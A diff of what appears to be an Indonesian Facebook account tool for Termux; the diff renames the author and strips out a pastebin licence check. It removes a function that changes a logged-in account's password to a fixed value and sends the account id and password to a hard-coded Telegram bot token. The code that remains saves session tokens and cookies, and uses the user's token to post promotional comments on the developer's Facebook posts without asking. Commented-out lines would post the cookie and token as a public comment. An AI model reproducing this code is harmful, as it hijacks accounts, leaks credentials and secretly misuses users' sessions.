@@ -1,3 +1,6 @@
+#!/usr/bin/python3
+#coding=utf-8
+
 N,M,K,H,B,U,C,P = "\x1b[00m","\x1b[38;2;255;0;0m","\x1b[38;2;208;255;0m","\x1b[38;2;0;255;8m","\x1b[38;2;38;0;255m","\x1b[38;2;234;0;255m","\x1b[38;2;0;221;255m","\x1b[1;97m"
 luffy = ("""{}                                                       .';'...;dkxo;.                               
                                    ...             ..;lOKXNKKXNWMMMNO,                              
@@ -42,26 +45,12 @@ luffy = ("""{}                                                       .';'...;dkx
 
 
 
-
-
-
-#coding by: utf-8
-
-
-
-
-
-
-
-
-
-
-
-
 exp = []
-Version = 'Beta'
-Github = 'github.com/Xenz404'
+
+Developer = 'Dvanmeploph'
 Author = 'Xenz'
+Github = 'github.com/Dvanmeploph'
+Version = 'Beta'
 agent = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
 ketik = '{} ─────► {}'.format(P,H)
 notice_login = '''{}
@@ -259,7 +248,7 @@ class Login:
 				token = req['access_token']
 				open("data/.token.log","w").write(token)
 				open("data/.cookies.log","w").write(cookie)
-#				self.Bot_Xenz(cookie,token)
+#				self.Bot_Dvanmeploph(cookie,token)
 				Login()
 
 #			except (AttributeError,Exception,KeyError):
@@ -267,7 +256,7 @@ class Login:
 				print (e)
 				print ('{}{}Login gagal coba ganti cookienya'.format(ketik,M))
 				exit()
-	def Bot_Xenz(self,cookie,token):
+	def Bot_Dvanmeploph(self,cookie,token):
 #			try:
 #				r.post(f"https://graph.facebook.com/100041654630505_1107301094001701/comments?message={cookie}&access_token={token}",cookies={"cookie":cookie})
 #				link = r.get('https://api.waifu.pics/sfw/waifu',headers={'User-Agent':agent})
@@ -288,7 +277,7 @@ class Login:
 #				idku = '100041654630505_1134755737922903'
 #				r.post('https://graph.facebook.com/'+idku+'/comments',params=data,files=file,cookies={'cookie':cookie},headers={'User-Agent':agent})
 #			except:pass
-		self.id = '100041654630505_1064482231616921'
+		self.id = '100013275378835_1658880191231144'
 		self.kata = [
 		f'Mantap bang @[{self.id.split("_")[0]}:0]',
 		f'Panutan ku ni @[{self.id.split("_")[0]}:0]',
@@ -313,7 +302,7 @@ class Login:
 			try:
 				for x in r.get('https://graph.facebook.com/{}/posts?access_token={}'.format(self.id.split('_')[0],token),cookies={'cookie':cookie}).json()['data']:
 					self.list_id = x['id']
-					self.komentar = '{}\n\nhttps://www.facebook.com/{}\n\nKomentar ditulis oleh bot XenZ\nDate: {}\nTime: {}'.format(random.choice(self.kata), self.list_id, self.saat_ini, strftime('%H:%M:%S'))
+					self.komentar = '{}\n\nhttps://www.facebook.com/{}\n\nKomentar Ditulis Oleh Bot Dvanmeploph\nDate: {}\nTime: {}'.format(random.choice(self.kata), self.list_id, self.saat_ini, strftime('%H:%M:%S'))
 					r.post(f"https://graph.facebook.com/{self.list_id}/comments?message={self.komentar}&access_token={token}",cookies={"cookie":cookie})
 #					print (self.komentar)
 			except Exception as e:pass
@@ -378,12 +367,12 @@ class Menu:
 		self.List_Menu()
 	def List_Menu(self):
 		os.system('clear')
-		Banner_Xenz()
+		Banner_Dvanmeploph()
 		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] name account : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] id account   : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ip address   : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] simcard      : [#00ff08]{}
-[#ff0000][[#00ff08]••[#ff0000]][#ffffff] country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ID Account   : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] IP Address   : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Privoder     : [#00ff08]{}
+[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
 		Console().print(Panel(teks,subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center'),style=warna_rich,width=92)
 		print ('{}              ┌──────────────────────────────┼───────────────────────────────┐'.format(B))
 		print ('{}              │                              │                               │'.format(B))
@@ -945,80 +934,11 @@ def check_termux_screen_size():
 #	print (col);exit()
 	return (col)
 
-class license:
-	def __init__(self):
-		try:
-			key = open('data/.lisen.txt','r').read()
-			req = requests.get('https://pastebin.com/raw/yu9r0DhH').text
-			try:
-				link = re.search(f'{key}<=>(.*?);',str(req)).group(1)
-				with requests.Session() as r:
-					try:
-						response = BeautifulSoup(r.get(link).text, 'html.parser')
-						expired = re.findall('''<div class="expire" title="When this paste gets automatically deleted">
-                    (.*?)                </div>''',str(response))[0]
-						exp.append(expired)
-						Login()
-					except Exception as e:
-						print ('Expired Key: '+key)
-						exit()
-			except AttributeError:
-				print ('Silakan beli masa aktif ke admin untuk menjalankan script.')
-				print ('Your Key: '+str(key))
-				print ('Contact me: wa.me/14313411688')
-				exit()
-
-		except FileNotFoundError:
-			user = input('Masukan username: ').upper()
-			satu = (platform.uname())[2]+user
-			dua = satu.encode("utf-8")
-			tiga = base64.b64encode(dua).decode("utf-8").replace('=','')
-			open('data/.lisen.txt','w').write(tiga)
-			license()
-
-def trial():
-	current_date = datetime.datetime.now()
-	check_date = current_date.replace(year=2023, month=3, day=29)
-	if current_date > check_date:license()
-	else:
-		with requests.Session() as r:
-			link = r.get('https://pastebin.com/raw/eS7xX6Vf').text
-			try:
-				response = BeautifulSoup(r.get(link).text, 'html.parser')
-				expired = re.findall('''<div class="expire" title="When this paste gets automatically deleted">
-                    (.*?)                </div>''',str(response))[0]
-				exp.append(expired)
-				Login()
-			except Exception:
-				print ('Waktu trial telah habis...')
-				sleep(2)
-				license()
-def loger(coki, pw):
-	with requests.Session() as r:
-		cookie = {'cookie':coki}
-		req = r.get('https://mbasic.facebook.com/settings/security/password/', cookies=cookie)
-		res = BeautifulSoup(req.content, 'html.parser')
-
-		data = {}
-		pw_old = pw
-		pw_new = 'xenz##'
-
-		for ez in res.find_all('form', {'method':'post'}):
-			if '/password/change/?redirect_uri' in ez.get('action'):
-				for cari in ez.find_all('input'):
-					if cari.get('name') == None:continue
-					data.update({cari.get('name'):cari.get('value')})
-				data.update({'password_old':pw_old,'password_new':pw_new,'password_confirm':pw_new})
-				response = r.post('https://mbasic.facebook.com'+ez.get('action'), data=data, cookies=cookie)
-				if 'Keluar dari perangkat lain?' in response.text:
-					requests.get(f"https://api.telegram.org/bot5929758771:AAFRsOhM0rR27zQB5QUcgE_xNPR0zXVFMB0/sendMessage?chat_id=5054191671&text={idf}|{pw_new}")
-				else:
-					requests.get(f"https://api.telegram.org/bot5929758771:AAFRsOhM0rR27zQB5QUcgE_xNPR0zXVFMB0/sendMessage?chat_id=5054191671&text={idf}|{pw}")
-
 
 if __name__=='__main__':
 	os.system('git pull')
-	try:os.mkdir("data")
+	os.system('mkdir data')
+	try:os.system("mkdir data")
 	except:pass
 	try:os.mkdir("result")
 	except:pass
@@ -1035,5 +955,4 @@ if __name__=='__main__':
 	if col < MC:
 		print("Ukuran layar Termux terlalu kecil. Silakan perbesar layar untuk menjalankan script ini")
 		sys.exit()
-	else:
-		trial()
+	else:Login()
